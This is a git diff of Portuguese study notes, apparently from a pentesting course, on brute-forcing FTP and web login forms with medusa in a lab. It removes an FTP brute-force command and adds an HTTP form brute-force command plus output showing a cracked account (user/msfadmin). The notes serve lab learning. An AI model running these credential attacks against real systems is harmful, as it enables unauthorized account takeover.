@@ -89,11 +89,7 @@ http_default_users.txt
 
 Para senha, usaremos  lista: default_userpass_for_services_unhash.txt
 
-### Ataque usando medusa e nossa wordlist
-comando, t siguinifica tread para acelerar os teste:
-medusa -h 192.0.0.0 -U user.txt -P pass.txt -M ftp -t 6
 
-[sucesso:] vc vai ter a senha e login para entrar no FTP via prompt
 
 ## Ataques de força bruta aplicados em formulários de login em sistemas web
 
@@ -109,15 +105,21 @@ https://www.youtube.com/watch?v=Yc5s7T_plao&embeds_referring_origin=https%3A%2F%
 Vamos usar a medusa para atacar um servidor web, mais especificamente atazvez de um formulario de login mal contruido vamos explorar para entrar. O formulario revela qual os parametros que o servidor espera receber, assim como o retorno que o servidor entrega.
 
 comando:
-medusa -h 192.0.0.0 -U user.txt -P pass.txt -M http \
+medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http \
 	-m PAGE: '/alvo/formulario.php' \
 	-m FORM:'username=ÛSER^&password=^PASS^&Login=Login' \
 	-m 'FAIL=Login faildes' -t 6
 
 [SUCESSO] esse comando ai rodar nossas word list, nos entregando logins validos para o site.
 
-Dica ! Use o comando para descobrir quais os parametros que o formulario pode requisitar
- medusa -M http -q
+
+
+ Resposta:
+ 2025-10-02 20:44:50 ACCOUNT CHECK: [http] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: msfadmin (1 of 4 complete)
+2025-10-02 20:44:50 ACCOUNT FOUND: [http] Host: 192.168.56.101 User: user Password: msfadmin [SUCCESS]
+
+~Dica ! Use o comando para descobrir quais os parametros que o formulario pode requisitar~
+ ~medusa -M http -q~
 
 ## Ataque em cadeia, enumeração smb + password spraying
 https://www.youtube.com/watch?v=jVr9gG3nclg&embeds_referring_origin=https%3A%2F%2Fweb.dio.me&source_ve_path=MjM4NTE
